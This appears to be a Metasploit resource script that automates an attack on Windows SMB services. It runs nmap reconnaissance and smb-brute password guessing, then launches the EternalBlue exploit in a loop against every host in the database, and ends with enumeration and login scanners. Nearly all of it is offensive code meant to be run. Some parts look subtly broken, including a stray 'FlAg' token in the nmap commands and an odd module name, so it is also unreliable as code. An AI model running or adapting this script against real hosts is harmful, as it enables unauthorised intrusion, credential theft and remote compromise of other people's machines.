<ruby>
print_line("")
print_status("Please wait, checking if RHOSTS are set globally...")
  # Check for rhosts in metasploit database
  if (framework.datastore['RHOSTS'] == nil)
    print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")
    return nil
  end

  # Using nmap to 'gather information' about target services
  print_good("RHOSTS set globally [ OK ] running scans...")
    run_single("nmap FlAg -T2 -Pn --reason --script banner.nse,dns-brute.nse,ip-geolocation-geoplugin.nse -p 137,139,445 #{framework.datastore['RHOSTS']}")
    print_line("")
      # Using nmap to populate metasploit database
      print_good("Please wait, running brute-force module")
      run_single("nmap FlAg -T2 -Pn --reason --script smb-os-discovery.nse,smb-enum-users.nse,smb-enum-shares.nse,smb-brute.nse -p 137,139,445 #{framework.datastore['RHOSTS']}")
      print_line("")

  # loop funtion to Exploit eternalblue vuln (ms17_10_eternalblue)...
  print_good("Please wait, trying to exploit ms17_10_eternalblue vulnerability")
    framework.db.hosts.each do |host|
      run_single("use exploit/windows/smb/ms17_10_eternalblue")
      run_single("set RHOST #{host.address}")
      run_single("exploit")
     end
   print_line("")
   run_single("db_nmap FlAg -O -Pn -p 137,139,445 #{framework.datastore['RHOSTS']}")
   print_line("")
   print_good("Please wait, running msf auxiliary modules...")
</ruby>


# Running msf auxiliary modules...
use auxiliary/scanner/smb/smb_version
run
use auxiliary/scanner/smb/pipe_auditor
run
use auxiliary/scanner/smb/smb2
run
use auxiliary/scanner/smb/smb_enumshares
run
use auxiliary/scanner/smb/smb_enumusers
run
use auxiliary/scanner/smb/smb_login
show options

